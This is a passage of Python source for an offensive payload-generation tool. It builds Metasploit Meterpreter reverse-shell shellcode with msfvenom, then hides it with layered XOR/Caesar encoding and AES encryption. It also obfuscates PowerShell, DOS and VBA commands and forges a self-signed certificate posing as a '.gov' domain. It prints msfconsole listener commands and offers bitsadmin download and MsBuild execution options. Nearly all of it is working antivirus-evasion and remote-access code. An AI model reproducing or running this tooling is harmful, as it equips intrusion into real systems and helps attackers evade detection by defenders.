                    RunCompileElf =  ((subprocess.Popen(CompileElf, shell=True, stdout=subprocess.PIPE).stdout).read().decode("utf-8")).rstrip("\n")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Compiled x64 ELF wrote to: " + (os.getcwd()+"/run.elf"))

    def BuildCertificate(emailAddress="info@center.gov", commonName="center.gov", countryName="US", localityName="New York", stateOrProvinceName="NY", organizationName="Center, Inc", organizationUnitName="SEC", serialNumber=0, validityStartInSeconds=0, validityEndInSeconds=10*365*24*60*60):
        #WIP
        StateList = ["AL", "AK", "AS", "AZ", "AR", "CA", "CO", "CT", "DE", "DC", "FM", "FL", "GA", "GU", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MH", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "MP", "OH", "OK", "OR", "PW", "PA", "PR", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VI", "VA", "WA", "WV", "WI", "WY"]

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 4096)
        cert = crypto.X509()
        cert.get_subject().C = countryName
        cert.get_subject().ST = stateOrProvinceName
        cert.get_subject().L = localityName
        cert.get_subject().O = organizationName
        cert.get_subject().OU = organizationUnitName
        cert.get_subject().CN = commonName
        cert.get_subject().emailAddress = emailAddress
        cert.set_serial_number(serialNumber)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(validityEndInSeconds)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha512')

        with open("/tmp/cert.pem", "w") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
        with open("/tmp/cert.pem", "a") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))

        #print(f"{bcolors.BOLD}{bcolors.OKGREEN}\t\t->{bcolors.ENDC}{bcolors.ENDC} Custom HTTPS Certificate wrote to: /tmp/cert.pem")
        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Custom HTTPS Certificate wrote to: /tmp/cert.pem")

class Obfuscate:

    def main(self):
        if self.ShellcodeType == "meterpreter":

            MeterpreterShellCode =  self.ShellCode[1] # Parses and returns MSFvenom meterpreter shellcode in stringformat.
            ShellCodeHeader = self.ShellCode[0].decode("utf-8")  # Parses and returns csharp byte array header.

            if self.OperatingSystem == "linux":
                 Obfuscator = Obfuscate.RunIterator(MeterpreterShellCode, self.Iterations, self.OperatingSystem)
                 ObfuscatedShellCode = Obfuscator[0]
                 DecodeInstructions = Obfuscator[1]
                 ShellCodeHeader = "unsigned char buf[] ="

                 CsharpObfuscatedShellCode = []
                 for i in range(0, len(ObfuscatedShellCode),2):
                     CsharpObfuscatedShellCode.append("\\x"+ObfuscatedShellCode[i]+ObfuscatedShellCode[i+1])
                 ObfuscatedShellCode = "".join(CsharpObfuscatedShellCode)
                 ObfuscatedShellCode = "\"" + ObfuscatedShellCode + "\";"

                 ELFModDecodeInstructions = []
                 for i in range(len(DecodeInstructions)):
                     if DecodeInstructions[i].split(" ")[3] == "^":
                         key = (DecodeInstructions[i].split(" ")[4])[:-1] # Parse Csharp decoder.
                         dec_key = (int(key, 16)) # Convert key to decimal
                         ELFModDecodeInstructions.append("\t\tbuf[i] = buf[i] ^ {};".format(dec_key))
                         #break
                     else:
                         key = (DecodeInstructions[i].split(" ")[4])[:-1]
                         operation = DecodeInstructions[i].split(" ")[3]
                         ELFModDecodeInstructions.append("\t\tbuf[i] = buf[i] {} {};".format(operation, key))

                 return ShellCodeHeader, ELFModDecodeInstructions, ObfuscatedShellCode

            if self.OperatingSystem == "windows":
                # Obfuscate shellcode, retuens Obfuscated Shellcode & Decoding Instructions.
                Obfuscator = Obfuscate.RunIterator(MeterpreterShellCode, self.Iterations, self.OperatingSystem)
                ObfuscatedShellCode = Obfuscator[0]
                DecodeInstructions = Obfuscator[1]

                # Patches the format for csharp obfuscated shellcode from non-hex-string to hex'ed string for chsarp.
                CsharpObfuscatedShellCode = []
                for i in range(0, len(ObfuscatedShellCode),2):
                    CsharpObfuscatedShellCode.append("0x"+ObfuscatedShellCode[i]+ObfuscatedShellCode[i+1])
                ObfuscatedShellCode = ",".join(CsharpObfuscatedShellCode) + " }"

                return ShellCodeHeader, DecodeInstructions, ObfuscatedShellCode

    # Buffer takes String value of hex, of two digits per hex value ffe4 = 0xff,0xe4
    def RunIterator(ShellCode, Iterations, OperatingSystem):

        DecodeInstructions = []
        MatrixEncoderInstructions = []
        for i in range(Iterations): # Generates
            MatrixEncoderInstructions.append(random.randrange(0, 2))

        for i in range (len(MatrixEncoderInstructions)):

            if MatrixEncoderInstructions[i] == 1:
                Shift = random.randrange(-255, 255) # Generates random value for CeaserShift.\
                ShellCode = Obfuscate.CeaserShift(ShellCode, Shift) # Obfuscate Once,
                ShellCode = ''.join(ShellCode) # Converts from list to string
                ShellCode = ShellCode.replace("0x", "") # Removes 0x

                if (Shift >= 0):
                    DecodeInstructions.insert(0, "buf[i] = (byte)(((uint)buf[i] - {}".format(Shift) + ") & 0xFF);") # If shift is Positive, Decode is Negative
                else:
                    DecodeInstructions.insert(0, "buf[i] = (byte)(((uint)buf[i] + {}".format(-Shift) + ") & 0xFF);") # If shift is Negative, Decode is Positive

            if MatrixEncoderInstructions[i] == 0:
                DecimalXORKey = random.randrange(255) # Generates random value for CeaserShift.\
                if len(hex(DecimalXORKey)) == 3:
                    HexXORKey = list(str(hex(DecimalXORKey)))
                    HexXORKey.insert(2,'0')
                    HexXORKey = ''.join(HexXORKey)
                    ShellCode = Obfuscate.XOR(ShellCode, DecimalXORKey)
                    DecodeInstructions.insert(0, "buf[i] = (byte)(((uint)buf[i] ^ {}".format(HexXORKey) + ") & 0xFF);")
                else:
                    ShellCode = Obfuscate.XOR(ShellCode, DecimalXORKey)
                    DecodeInstructions.insert(0, "buf[i] = (byte)(((uint)buf[i] ^ {}".format(str(hex(DecimalXORKey))) + ") & 0xFF);")

        return ShellCode, DecodeInstructions

     # Buffer takes String value of hex, of two digits
    def CeaserShift(Buffer,Shift):
        CaesarEncodedArray = []
        for i in range(0,len(Buffer),2):
            CaesarShiftChar = (int(Buffer[i]+Buffer[i+1], 16) + Shift) % 256
            CaesarEncodedArray.append(hex(CaesarShiftChar))
        for i in range(len(CaesarEncodedArray)):
            if len(CaesarEncodedArray[i]) == 3:
                HexInsertFill = list(CaesarEncodedArray[i])
                HexInsertFill.insert(2,'0')
                HexInsertFill = ''.join(HexInsertFill)
                CaesarEncodedArray[i] = HexInsertFill

        ReturnValue = ''.join(CaesarEncodedArray)
        ReturnValue = ReturnValue.replace("0x", "") # Removes 0x

        return ReturnValue # Returns Array of Hex values in `0xAA` format

    # Buffer takes String value of hex, of two digits
    def XOR(Buffer, DecimalXOR):
        XOREncodedArray = []
        for i in range(0,len(Buffer),2):
            XOREncodedArray.append(hex(int(Buffer[i]+Buffer[i+1], 16) ^ DecimalXOR ))

        for i in range(len(XOREncodedArray)):
            if len(XOREncodedArray[i]) == 3:
                HexInsertFill = list(XOREncodedArray[i])
                HexInsertFill.insert(2,'0')
                HexInsertFill = ''.join(HexInsertFill)
                XOREncodedArray[i] = HexInsertFill

        ReturnValue = ''.join(XOREncodedArray)
        ReturnValue = ReturnValue.replace("0x", "") # Removes 0x

        return ReturnValue # Returns Hex values in ffee format

    # Method for obfuscating VBA.
    def VBAObfuscate(ObfuscateStagedCommand, Format, Shift):
        VBAObfuscatedDataSingle = []
        for char in ObfuscateStagedCommand:
            Decimal = str(ord(char) + Shift)
            if len(Decimal) == 1:
                VBAObfuscatedDataSingle.append("00" + Decimal)
            elif len(Decimal) == 2:
                VBAObfuscatedDataSingle.append("0" + Decimal)
            elif len(Decimal) == 3:
                VBAObfuscatedDataSingle.append(Decimal)

        VBAObfuscatedPayload = ''.join(VBAObfuscatedDataSingle)

        if Format == "MultiLine":
            VBAObfuscatedDataMulti = []
            VBAObfuscatedPayloadMultiLine = [VBAObfuscatedPayload[index : index + 125] for index in range(0, len(VBAObfuscatedPayload), 125)]
            for i in range(len(VBAObfuscatedPayloadMultiLine)):
                if i == 0:
                    VBAObfuscatedDataMulti.append('"'+VBAObfuscatedPayloadMultiLine[i] + '" _\n')
                elif i == len(VBAObfuscatedPayloadMultiLine) - 1:
                    VBAObfuscatedDataMulti.append('& "'+VBAObfuscatedPayloadMultiLine[i] + '"')
                else:
                    VBAObfuscatedDataMulti.append('& "'+VBAObfuscatedPayloadMultiLine[i] + '" _\n')

            return ''.join(VBAObfuscatedDataMulti) # Retuens MultiLine format version
        else:
            return ''.join(VBAObfuscatedPayload) # Returns single line version

    # AES Encryption method.
    def AESEncryption(shellcode):
        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Encrypting Payload...")

        IV = '0123456789abcdef'
        Key = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
        mode = AES.MODE_CBC

        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Using AES key: '" + Key + "'")
        encryptor = AES.new(Key.encode('utf-8'), mode,IV=IV.encode('utf-8'))

        # Used to patch csharp shellcode to python shell code.
        csharpObfuscatedShellCode = shellcode
        PythonObfuscatedShellCode = ((csharpObfuscatedShellCode.replace("0x", "\\x"))[:-2]).replace(",", "")
        ByteConversion = bytes(PythonObfuscatedShellCode, 'utf-8')
        data = (ByteConversion.decode('unicode-escape').encode('ISO-8859-1'))

        length = 16 - (len(data) % 16)
        data += bytes([length])*length

        ciphertext = encryptor.encrypt(data)
        try:
            with open('cipher.out', 'w') as CipherFile:
                CipherFile.write((base64.b64encode(ciphertext)).decode('utf-8'))
            print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Encrypted Shellcode wrote to: " + (os.getcwd()+"/cipher.out") )
        except:
            print(f"{bcolors.FAIL}[-]{bcolors.ENDC} Failed to write Encrypted Shellcode.")

        try:
            with open('key.out', 'w') as KeyFile:
                KeyFile.write(Key)
            print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Encryption Key wrote to: " + (os.getcwd()+"/key.out") )

        except:
            print(f"{bcolors.FAIL}[-]{bcolors.ENDC} Failed to write Encryption Key.")

    #Obfsucate both PowerShell and DOS commands via pwsh function.
    def ShellCommands(type, command): # Requires Linux pwsh
        ImportDirectory = os.path.dirname(os.path.realpath(__file__)) + "/Modules/"
        if type == "PowerShell":
            try:
                print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Obfuscating PowerShell Commands...")
                LoadInvoke  = (f"pwsh -command \"Import-Module {ImportDirectory}Invoke-Obfuscation/Invoke-Obfuscation.psd1; ")#; Out-ObfuscatedStringCommand {{[Command]}} 1\"".replace("[Command]", ''.join(command))).format(ImportDirectory)
                ExecuteInvokeObfuscate = "Out-ObfuscatedStringCommand {{{{Command}}}} 1\"".replace("{{{Command}}}", ''.join(command))
                InvokeObfuscatedTemplate = (LoadInvoke + ExecuteInvokeObfuscate)

                InvokeStringCommand =  ((subprocess.Popen(InvokeObfuscatedTemplate, shell=True, stdout=subprocess.PIPE).stdout).read().decode("utf-8")).rstrip("\n")
                return InvokeStringCommand
            except Exception as E:
                print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Failed to Obfuscate PowerShell Commands...")
                print(E)
        if type == "Dos":
            try:
                print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Obfuscating Dos Commands...")
                InvokeObfuscatedTemplate = ("""pwsh -command \"Import-Module {}Invoke-DOSfuscation/Invoke-DOSfuscation.psd1; \\$Command=\'{{{Command}}}\'; Out-DosConcatenatedCommand -Command \\$Command -ObfuscationLevel 2\"""".replace("{{{Command}}}", ''.join(command))).format(ImportDirectory)
                DosStringCommand =  ((subprocess.Popen(InvokeObfuscatedTemplate, shell=True, stdout=subprocess.PIPE).stdout).read().decode("utf-8")).rstrip("\n")
                return DosStringCommand
            except Exception as E:
                print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Failed to Obfuscate Dos Commands...")
                print(E)

class CreateShellCode:

    def Meterpreter(self):
        try:
            if self.Architecture == "x86":
                if self.OperatingSystem == "windows":
                    if self.ConnectionType == "https":
                        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating Windows x86 Meterpreter Reverse HTTPS Shellcode...")
                        DefaultShellCode = subprocess.check_output(["msfvenom","-p","windows/meterpreter/reverse_https","LHOST={}".format(self.IP),"LPORT={}".format(self.PORT),"EXITFUNC={}".format(self.ExitFunc),"-f","csharp"], stderr=subprocess.DEVNULL)
                        #BuildCertificate()
                    if self.ConnectionType == "tcp":
                        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating Windows x86 Meterpreter Reverse TCP Shellcode...")
                        DefaultShellCode = subprocess.check_output(["msfvenom","-p","windows/meterpreter/reverse_tcp","LHOST={}".format(self.IP),"LPORT={}".format(self.PORT),"EXITFUNC={}".format(self.ExitFunc),"-f","csharp"], stderr=subprocess.DEVNULL)
                if self.OperatingSystem == "linux":

                    if self.ConnectionType == "https":
                        print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC}{bcolors.ENDC} Warning: The connection type of `https` was selected on a non-compatable object.")
                        print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC}{bcolors.ENDC} Warning: Switching to tcp connection.")
                        self.ConnectionType = "tcp"

                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating Linux x86 Meterpreter Shellcode...")
                    DefaultShellCode = subprocess.check_output(["msfvenom","-p","linux/x86/meterpreter/reverse_tcp","LHOST={}".format(self.IP),"LPORT={}".format(self.PORT),"EXITFUNC={}".format(self.ExitFunc),"-f","csharp"], stderr=subprocess.DEVNULL)

            elif self.Architecture == "x64":
                if self.OperatingSystem == "windows":
                    if self.ConnectionType == "https":
                        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating Windows x64 Meterpreter Reverse HTTPS Shellcode...")
                        DefaultShellCode = subprocess.check_output(["msfvenom","-p","windows/x64/meterpreter/reverse_https","LHOST={}".format(self.IP), "LPORT={}".format(self.PORT), "EXITFUNC={}".format(self.ExitFunc),"-f", "csharp"], stderr=subprocess.DEVNULL)

                        #BuildCertificate()

                    if self.ConnectionType == "tcp":
                        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating Windows x64 Meterpreter Reverse TCP Shellcode...")
                        DefaultShellCode = subprocess.check_output(["msfvenom","-p","windows/x64/meterpreter/reverse_tcp","LHOST={}".format(self.IP),"LPORT={}".format(self.PORT),"EXITFUNC={}".format(self.ExitFunc),"-f","csharp"], stderr=subprocess.DEVNULL)
                if self.OperatingSystem == "linux":

                    if self.ConnectionType == "https":
                        print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC}{bcolors.ENDC} Warning: The connection type of `https` was selected on a non-compatable object.")
                        print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC}{bcolors.ENDC} Warning: Switching to tcp connection.")
                        self.ConnectionType = "tcp"

                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating Linux x64 Meterpreter Shellcode...")
                    DefaultShellCode = subprocess.check_output(["msfvenom","-p","linux/x64/meterpreter/reverse_tcp","LHOST={}".format(self.IP),"LPORT={}".format(self.PORT),"EXITFUNC={}".format(self.ExitFunc),"-f","csharp"], stderr=subprocess.DEVNULL)

            MeterpreterShellCode = (DefaultShellCode.splitlines())

        except Exception as Error:
            print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Failed to build Meterpreter shellcode: {Error}")
            exit()

        DefaultShellCodeArray = []
        for i in range(len(MeterpreterShellCode)):
            if (i > 0): # SKIP shellcode Header.
                SingleShellCodeLine = [x for x in MeterpreterShellCode[i].decode("utf-8").split(",") if x]
                for HexChar in SingleShellCodeLine:
                    HexChar = HexChar.split(" ", 1)[0] # Removes Ending Bracket
                    HexChar = HexChar.replace("0x", "") # Removes 0x
                    DefaultShellCodeArray.append(HexChar) # Append to array
            else:
                ShellCodeHeader = MeterpreterShellCode[i]

        DefaultShellCodeString = ''.join(DefaultShellCodeArray)

        # Shellcode Header Examp: b'byte[] buf = new byte[701] {'
        # DefaultShellCodeString Examp: fc4883e4f0e8cc000000415141505...

        return ShellCodeHeader, DefaultShellCodeString

    def CobaltStrike(self):
        print("WIP")

    def Listener(self):

        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t\u1401{bcolors.ENDC}{bcolors.ENDC}")

        if (self.Listener_Category).upper() == "W2":
            print(f"{bcolors.BOLD}{bcolors.OKGREEN}[*]{bcolors.ENDC}{bcolors.ENDC} Listener: \nsudo msfconsole -q -x 'use exploit/multi/handler; set payload generic/shell_reverse_tcp; set lport {self.PORT}; set lhost {self.IP}; set EXITFUNC {self.ExitFunc}; run'")

        if (self.Listener_Category).upper() == "W1":
            if self.Architecture == "x86":
                if self.ConnectionType == "tcp":
                    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[*]{bcolors.ENDC}{bcolors.ENDC} Listener: \nsudo msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lport {self.PORT}; set lhost {self.IP}; set EXITFUNC {self.ExitFunc}; run'")

                if self.ConnectionType == "https":
                    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[*]{bcolors.ENDC}{bcolors.ENDC} Listener: \nsudo msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set lport {self.PORT}; set lhost {self.IP}; set EXITFUNC {self.ExitFunc}; set HandlerSSLCert /tmp/cert.pem; run'")

            if self.Architecture == "x64":
                if self.ConnectionType == "tcp":
                    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[*]{bcolors.ENDC}{bcolors.ENDC} Listener: \nsudo msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lport {self.PORT}; set lhost {self.IP}; set EXITFUNC {self.ExitFunc}; run'")

                if self.ConnectionType == "https":
                    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[*]{bcolors.ENDC}{bcolors.ENDC} Listener: \nsudo msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lport {self.PORT}; set lhost {self.IP}; set EXITFUNC {self.ExitFunc}; set HandlerSSLCert /tmp/cert.pem; run'")

        if (self.Listener_Category).upper() == "L1":
            if self.Architecture == "x86":
                print(f"{bcolors.BOLD}{bcolors.OKGREEN}[*]{bcolors.ENDC}{bcolors.ENDC} Listener: \nsudo msfconsole -q -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lport {self.PORT}; set lhost {self.IP}; set EXITFUNC {self.ExitFunc}; run'")
            if self.Architecture == "x64":
                print(f"{bcolors.BOLD}{bcolors.OKGREEN}[*]{bcolors.ENDC}{bcolors.ENDC} Listener: \nsudo msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lport {self.PORT}; set lhost {self.IP}; set EXITFUNC {self.ExitFunc}; run'")

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description=Version.BANNER,formatter_class=RawTextHelpFormatter,epilog=Version.ExampleUsage)

    parser.add_argument('Payload', action='store', help='Payload to use (--list payloads to list).') # Create new function to show all methods via JSON parse...
    parser.add_argument('ConnectionInfo', metavar = "IP:PORT", action='store', help='The listen address and port.')
    parser.add_argument('-i', action='store',metavar = "<Iterations>",  default=12, help='The amount of times the shellcode is obfuscated. (default: 12).')
    parser.add_argument('-wt', action='store',metavar = "<Directory>",  default="C:\\Windows\\Tasks\\", help='The location any saved files is saved to when a staged attack occurs. (Default: C:\\Windows\\Tassks\\).')
    parser.add_argument('-dm', action='store',metavar = "<Method>",  default="bitsadmin", help='The method used to download the staged payload. (Default: Bitsadmin).')
    parser.add_argument('-em', default="msbuild", metavar = "<Method>", help='The Execution method. (Default: MsBuild).')
    parser.add_argument('--aes', action='store_true', help="Have 128-bit encrypted meterpreter shellcode stored remotly.")

    MeterpreterGroup = parser.add_argument_group('Meterpreter Options')
    MeterpreterGroup.add_argument('-exit', action="store", metavar = "<ExitFunc>", default="thread", help='Exit technique (Accepted: seh, thread, process, none).')
    MeterpreterGroup.add_argument('--tcp', action='store_true', help="Type of connection (Default: https).")

    MiscGroup = parser.add_argument_group('Misc Options')
    MiscGroup.add_argument('--list', action="store_true", help='List all payload modules.')
    MiscGroup.add_argument('--debug', action="store_true", help='Switches to debug mode.')
    MiscGroup.add_argument('-config', action="store", metavar="<Dicrectory>", default=(os.path.dirname(os.path.realpath(__file__)) + "/Config/config.json"), help="The configuration file containing payload build instructions (Default: ./Config/config.json).")

    # Temporary patch till I can find a way to display payloads via ArgParse...
    if "--list" in sys.argv:
        Version.PAYLOAD_OPTIONS()
        exit(0)

    # If no paramaters are specified.
    if len(sys.argv)==1:
        parser.print_help()
        exit(1)

    else:
        args = parser.parse_args()
        Runner = WileECoyote(args)
        Runner.BuildCore()
